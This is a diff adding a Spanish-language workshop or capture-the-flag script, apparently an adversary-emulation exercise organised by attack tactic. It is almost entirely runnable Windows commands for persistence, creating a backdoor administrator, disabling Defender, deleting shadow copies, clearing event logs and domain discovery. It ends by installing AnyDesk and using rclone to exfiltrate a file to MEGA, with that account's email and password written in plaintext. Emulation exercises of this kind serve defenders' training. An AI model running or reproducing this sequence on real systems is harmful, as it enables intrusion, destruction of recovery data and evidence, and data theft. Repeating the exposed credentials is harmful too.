@@ -1,0 +1,75 @@
+1. **EXECUTION**
+
+schtasks /create /tn "Workshop Task 2024" /tr "C:\Windows\System32\calc.exe" /sc daily /st 10:20
+
+2. **PERSISTENCE**
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Workshop registry 2024" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
+
+3. **PRIVILEGE ESCALATION**
+
+net user certuser Sisap2024 /add
+net localgroup administrators certuser /add
+
+4. **DEFENSE EVASION**
+
+# Cambio de configuraciones en Defender (PowerShell)
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list
+Set-MpPreference -DisableRealtimeMonitoring $true
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+
+
+WMIC.exe shadowcopy delete /nointeractive
+vssadmin.exe delete shadows /all /quiet
+wevtutil cl system
+wevtutil clear-log application
+wevtutil clear-log security
+wevtutil clear-log setup
+
+5. **DISCOVERY**
+
+whoami
+whoami /groups
+systeminfo
+wmic logicaldisk get name
+ipconfig
+arp -a
+net localgroup administrators
+net group /domain "Domain Admins"
+net group "Enterprise Admins" /domain
+nltest /dclist:windomain.local
+nltest /domain_trusts
+net share
+fsutil fsinfo drives
+
+5. **COMMAND AND CONTROL**
+
+(PowerShell)
+Invoke-WebRequest -Uri 'https://download.anydesk.com/AnyDesk.exe' -OutFile 'C:\Windows\Temp\AnyDesk.exe'
+Start-Process -Wait -FilePath 'C:\Windows\Temp\AnyDesk.exe' -ArgumentList '/S'
+
+# **CAPTURE DE FLAG**
+
+# Descargar el instalador de AnyDesk y configuralo
+
+(PowerShell)
+Invoke-WebRequest https://downloads.rclone.org/v1.56.0/rclone-v1.56.0-windows-amd64.zip -OutFile 'C:\Windows\Temp\rclone.zip'
+Expand-Archive -Path 'C:\Windows\Temp\rclone.zip' -DestinationPath 'C:\Windows\Temp\'
+cd C:\Windows\Temp\rclone-v1.56.0-windows-amd64
+.\rclone.exe config
+
+# configurando rclon
+n
+name: cert
+storage: mega
+user: huntercert01@gmail.com
+password: NaQ@YGls9%cUHMGu
+n
+y
+q
+# Creemos un archivo para exfiltrar
+echo CTF logrado > marvinamador.txt
+
+# Comando para exfiltrar el archivo creado
+.\rclone.exe copy "C:\Windows\Temp\rclone-v1.56.0-windows-amd64\marvinamador.txt" cert: -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 3 --bwlimit 5M
+
